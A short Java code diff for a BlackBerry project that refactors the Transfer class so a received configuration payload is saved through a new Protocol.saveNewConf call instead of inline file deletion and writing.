@@ -24,6 +24,7 @@ import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.action.Apn;
+import blackberry.action.sync.Protocol;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
@@ -409,15 +410,8 @@ public class Transfer {
 
         fillPayload(command);
         if (command.size() > 0) {
-            // String filename = Encryption.encryptName(Conf.NEW_CONF, 1);
-            final AutoFlashFile file = new AutoFlashFile(Conf.NEW_CONF_PATH
-                    + Conf.NEW_CONF, true);
-
-            if (file.exists()) {
-                file.delete();
-            }
-            file.create();
-            final boolean ret = file.write(command.payload);
+            
+            final boolean ret = Protocol.saveNewConf(command.payload);
             if (!ret) {
                 throw new CommandException(); //"write"
             } else {
